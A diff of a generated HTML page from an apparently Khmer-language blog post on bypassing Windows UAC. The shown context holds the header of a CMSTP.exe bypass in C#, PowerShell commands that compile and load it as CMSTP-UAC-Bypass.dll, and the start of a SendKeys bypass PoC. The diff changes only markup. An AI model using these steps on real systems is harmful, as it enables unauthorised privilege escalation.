@@ -1358,7 +1358,7 @@
     <meta property="twitter:description" content="Craft a powershell script to bypass uac with dll method.">
   
 
-<meta name="generator" content="Hugo 0.86.1" />
+<meta name="generator" content="Hugo 0.83.1" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1740,7 +1740,7 @@
 <h4 id="c-dll-reflection-code">C# DLL Reflection Code</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+<pre class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -1842,7 +1842,7 @@
 </span><span class="lnt">100
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="cm">/* 
+<pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="cm">/* 
 </span><span class="cm">UAC Bypass using CMSTP.exe microsoft binary.
 </span><span class="cm">Code author: Andre Marques (@_zc00l)
 </span><span class="cm">*/</span>
@@ -1950,10 +1950,10 @@
 ដើម្បីបំប្លែងកូដទៅជាឯកសារ dll យើងអាចប្រើពាក្យបញ្ជានៅលើ powershell ដូចខាងក្រោម៖</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Add-Type</span> <span class="n">-TypeDefinition</span> <span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllText</span><span class="p">(</span><span class="s2">&#34;$pwd\Source.cs&#34;</span><span class="p">))</span> <span class="n">-ReferencedAssemblies</span> <span class="s2">&#34;System.Windows.Forms&#34;</span> <span class="n">-OutputAssembly</span> <span class="s2">&#34;CMSTP-UAC-Bypass.dll&#34;</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Add-Type</span> <span class="n">-TypeDefinition</span> <span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllText</span><span class="p">(</span><span class="s2">&#34;$pwd\Source.cs&#34;</span><span class="p">))</span> <span class="n">-ReferencedAssemblies</span> <span class="s2">&#34;System.Windows.Forms&#34;</span> <span class="n">-OutputAssembly</span> <span class="s2">&#34;CMSTP-UAC-Bypass.dll&#34;</span></code></pre></td></tr></table>
 </div>
 </div>
 <p>ក្រោយបំប្លែងរួចវានឹងបង្កើតចេញជាឯកសារមួយមានឈ្មោះថា <span style="color:red">&ldquo;CMSTP-UAC-Bypass.dll&rdquo;</span></p>
@@ -1961,7 +1961,7 @@
 <p>ដើម្បីប្រើប្រាស់ឯកសារ dll ដែលបានបង្កើតរួចឲ្យដំណើរការ Bypass UAC យើងអាចប្រើពាក្យបញ្ជាដូចខាងក្រោម៖</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1970,7 +1970,7 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="no">[Reflection.Assembly]</span><span class="p">::</span><span class="n">Load</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&#34;$pwd\CMSTP-UAC-Bypass.dll&#34;</span><span class="p">))</span>
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="no">[Reflection.Assembly]</span><span class="p">::</span><span class="n">Load</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&#34;$pwd\CMSTP-UAC-Bypass.dll&#34;</span><span class="p">))</span>
 
 <span class="n">GAC</span>    <span class="n">Version</span>        <span class="n">Location</span>
 <span class="p">---</span>    <span class="p">-------</span>        <span class="p">--------</span>
@@ -1985,7 +1985,7 @@
 <h4 id="bonus---bypass-with-ps1-one-file-action">Bonus - Bypass With PS1 (One File Action)</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+<pre class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -2120,7 +2120,7 @@
 </span><span class="lnt">133
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># UAC Bypass poc using SendKeys</span>
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># UAC Bypass poc using SendKeys</span>
 <span class="c"># Version 1.0</span>
 <span class="c"># Author: Oddvar Moe</span>
 <span class="c"># Functions borrowed from: https://powershell.org/forums/topic/sendkeys/</span>
